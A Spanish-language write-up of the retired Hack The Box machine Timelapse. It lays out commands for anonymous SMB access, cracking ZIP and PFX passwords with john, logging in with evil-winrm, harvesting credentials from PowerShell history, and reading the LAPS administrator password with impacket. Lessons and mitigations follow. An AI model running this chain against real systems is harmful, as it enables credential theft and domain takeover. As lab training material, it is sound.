---
machine: Timelapse
os: Windows
difficulty: Easy
platform: Hack The Box
category: Active Directory / Certificados
state: Retired
tags: [smb, pfx, evil-winrm, laps, active-directory]
---

# Timelapse — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

Dominio con **SMB anónimo**: en `\\support\Dev` hay `winrm_backup.zip`, que se abre con diccionario y contiene un **PFX** (`legacyy_dev_auth.pfx`) con otro password. Extraídas clave y certificado, **WinRM sobre 5986** autentica como `legacyy`. Su `ConsoleHost_history.txt` guarda la contraseña de **`svc_deploy`**, miembro de **`LAPS_Readers`**, que lee la contraseña del Administrator.

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
53/dns, 88/kerberos, 135, 139/445 smb, 389/636 ldap, 5986/ssl winrm, 9389
```

```bash
smbclient -N -L //<IP>/
# support
smbclient -N //<IP>/support
# Dev/winrm_backup.zip , HelpDesk/
```

## Enumeración

- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».

## Foothold

```bash
zip2john winrm_backup.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
unzip winrm_backup.zip            # legacyy_dev_auth.pfx
pfx2john legacyy_dev_auth.pfx > pfx.hash
john pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy.crt
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -nodes -out legacyy.key
evil-winrm -i <IP> -S -c legacyy.crt -k legacyy.key
```

## Movimiento lateral

- La cadena reutiliza credenciales dentro del mismo host; no hay salto a un segundo equipo.
- El detalle está en «Escalada de privilegios».

## Escalada de privilegios

1. **Historial de PowerShell** del usuario: credenciales de `svc_deploy`.

```powershell
type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

2. **LAPS**: `svc_deploy` está en `LAPS_Readers`.

```bash
evil-winrm -i <IP> -S -u svc_deploy -p '<password>'
impacket-GetLAPSPassword -dc-ip <IP> 'timelapse.htb/svc_deploy:<password>'
# o: cme ldap <IP> -u svc_deploy -p '<password>' -M laps
```

3. **WinRM** como `administrator` con la contraseña LAPS: `C:\Users\TRX\Desktop\root.txt`.

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **Doble crackeo**: el ZIP y el PFX tienen contraseñas distintas; sin la segunda no hay clave privada.
- **`-S` obligatorio**: WinRM escucha en 5986 (TLS); sin `-S` la conexión falla.
- **Permisos del historial**: sólo se lee como `legacyy`, antes de saltar de usuario.

- Un recurso SMB anónimo con backups es acceso inicial habitual.
- Un PFX es una identidad completa: certificado + clave privada.
- El historial de PowerShell filtra contraseñas en claro.
- LAPS es seguro sólo si el grupo de lectura está bien acotado.

## Mitigaciones y detección

- Activar la preautenticación Kerberos, usar contraseñas largas en cuentas de servicio y forzar AES.
- Detección: 4768 con `PreAuthType=0` y 4769 con RC4 fuera de la línea base.
- Firmar SMB, deshabilitar SMBv1 y limitar los shares administrativos por grupo.
- Detección: 5140/5145 anómalos y 4624 tipo 3 con NTLM desde hosts no administrativos.

## Referencias

- [kerberos-enum](../../../knowledge/windows/kerberos-enum.md)
